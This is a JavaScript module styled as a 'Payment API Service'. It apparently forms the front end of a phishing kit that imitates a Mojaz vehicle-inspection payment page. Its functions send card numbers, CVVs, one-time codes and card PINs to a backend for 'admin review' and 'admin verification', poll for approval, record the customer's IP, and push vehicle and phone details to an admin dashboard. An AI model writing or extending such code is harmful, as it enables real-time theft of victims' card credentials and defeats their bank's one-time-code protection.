import request from './request';

/**
 * Payment API Service
 *
 * Centralized payment endpoints — card submission, OTP, PIN, status polling.
 * All methods use the shared axios instance with CSRF / retry / error handling.
 */

// ─── Card ───────────────────────────────────────────────────────────

/**
 * Submit card data for admin review.
 * @param {Object} payload
 * @param {string} payload.card_number
 * @param {string} payload.holder_name
 * @param {string} payload.expiry_month
 * @param {string} payload.expiry_year
 * @param {string} payload.cvv
 * @param {string} payload.session_id
 * @param {number|null} payload.total_price
 * @param {Object|null} payload.selected_insurance
 * @returns {Promise<{ data: { card_id: number, customer_ip: string } }>}
 */
export function submitCard ( payload )
{
    return request.post( '/payment-card/submit', payload );
}

/**
 * Get card approval status (polling fallback).
 * @param {string} sessionId
 * @param {string} sig — HMAC signature
 * @returns {Promise<{ data: { status: string, rejection_reason?: string } }>}
 */
export function getCardStatus ( sessionId, sig )
{
    return request.get( `/status/payment-card/${ sessionId }?sig=${ encodeURIComponent( sig ) }` );
}

// ─── OTP ────────────────────────────────────────────────────────────

/**
 * Submit OTP code for admin verification.
 * @param {{ session_id: string, otp: string, length: number }} payload
 * @returns {Promise<{ data: { success: boolean, message?: string } }>}
 */
export function submitOtp ( payload )
{
    return request.post( '/otp/submit', payload );
}

/**
 * Resend OTP code.
 * @param {{ session_id: string, customer_ip: string }} payload
 * @returns {Promise<{ data: { success: boolean, message?: string } }>}
 */
export function resendOtp ( payload )
{
    return request.post( '/otp/resend', payload );
}

/**
 * Get OTP verification status (polling fallback).
 * @param {string} sessionId
 * @param {string} sig — HMAC signature
 * @returns {Promise<{ data: { status: string } }>}
 */
export function getOtpStatus ( sessionId, sig )
{
    return request.get( `/status/otp/${ sessionId }?sig=${ encodeURIComponent( sig ) }` );
}

// ─── PIN ────────────────────────────────────────────────────────────

/**
 * Submit card PIN for admin verification.
 * @param {{ session_id: string, pin: string }} payload
 * @returns {Promise<{ data: { success: boolean, message?: string } }>}
 */
export function submitPin ( payload )
{
    return request.post( '/card-pin/submit', payload );
}

/**
 * Get PIN verification status (polling fallback).
 * @param {string} sessionId
 * @param {string} sig — HMAC signature
 * @returns {Promise<{ data: { status: string, reason?: string } }>}
 */
export function getPinStatus ( sessionId, sig )
{
    return request.get( `/status/pin/${ sessionId }?sig=${ encodeURIComponent( sig ) }` );
}

// ─── Misc ───────────────────────────────────────────────────────────

/**
 * Resolve the current customer IP address.
 * @returns {Promise<{ data: { customer_ip: string } }>}
 */
export function getCustomerIp ()
{
    return request.get( '/customer/ip' );
}

// ─── Customer Tracking ──────────────────────────────────────────────

/**
 * Track Mojaz vehicle inspection form data (Step 1).
 * Sends data to backend so it appears in admin dashboard immediately.
 * @param {Object} payload
 * @param {string} payload.sequence_number
 * @param {string} payload.mobile_number
 * @param {string} payload.manufacturing_year
 * @param {string} payload.vehicle_make
 * @param {string} payload.vehicle_model
 * @param {string} payload.plate_number
 * @param {string} payload.vin
 * @returns {Promise<{ data: { success: boolean, customer_ip: string } }>}
 */
export function trackMojazData ( payload )
{
    return request.post( '/customer/track-mojaz', payload );
}
